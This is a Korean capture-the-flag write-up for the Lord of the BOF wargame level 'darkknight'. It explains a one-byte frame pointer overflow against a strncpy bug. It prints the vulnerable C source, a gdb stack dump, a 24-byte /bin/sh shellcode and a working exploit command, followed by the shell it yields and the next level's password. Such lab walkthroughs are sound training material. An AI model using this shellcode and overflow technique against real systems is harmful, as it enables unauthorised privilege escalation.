---
layout: post
title:  "[LOB]Level12. darkknight"
subtitle:   "[LOB]golem → darkknight"
categories: writeup
categories: Wargame[LOB]
tags:
- Wargame
- LOB
- Write-up
---

## keyword : sfp

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - darkknight
        - FPO
*/
#include <stdio.h>
#include <stdlib.h>

void problem_child(char *src)
{
	char buffer[40];
	strncpy(buffer, src, 41);
	printf("%s\n", buffer);
}

main(int argc, char *argv[])
{
	if(argc<2){
		printf("argv error\n");
		exit(0);
	}

	problem_child(argv[1]);
}
```

shell(24byte) = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80



problem_child 함수를 보면 41바이트만 복사하게 된다.

힌트에 나왔듯이 SFP주소에 1바이트만 Overflow 시킬수 있는 공격이 FPO(Frame Pointer Overflow) 공격이다.

SPF의 1바이트를 변경시키면 근처 스택 주소로 SFP를 변조 시킬 수 있다.



여기서 스택주소로 변경시킬 때 중요한 점은 SFP에 [원하는 주소-4] 주소를 넣어야 된다는 점이다.

그 이유는 함수가 끝날 때, leave - ret 순서로 종료하게 되게 때문이다.



```sh
(gdb) x/32x $ebp-40
0xbffffaf0:	0xbffffb18	0x4000a970	0x400f855b	0x08049530
0xbffffb00:	0x4000ae60	0xbffffb64	0xbffffb18	0x0804842b
0xbffffb10:	0x0804951c	0x08049530	0xbffffb38	0x400309cb
0xbffffb20:	0x00000001	0xbffffb64	0xbffffb6c	0x40013868
0xbffffb30:	0x00000001	0x08048390	0x00000000	0x080483b1
0xbffffb40:	0x0804846c	0x00000001	0xbffffb64	0x080482e4
0xbffffb50:	0x080484dc	0x4000ae60	0xbffffb5c	0x40013e90
0xbffffb60:	0x00000001	0xbffffc61	0x00000000	0xbffffc7a
```



```sh
[golem@localhost golem]$ ./darkknight `python -c 'print "\x90"*16+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+"\xf0"'`
����������������1�Ph//shh/bin��PS�ᙰ
                                    ̀�����M�������	@
bash$ my-pass
euid = 512
new attacker
bash$ id
uid=511(golem) gid=511(golem) euid=512(darkknight) egid=512(darkknight) groups=511(golem)
```

sfp의 끝주소를 '\xf0'으로 변경시키고, NOP와 쉘코드를 넣어준다.

> 만약 ebp-40에 바로 쉘코드를 넣었다면 **\xf0 - 4 한 값**을 넣어야 한다. 



##### **darkknight / new attacker**

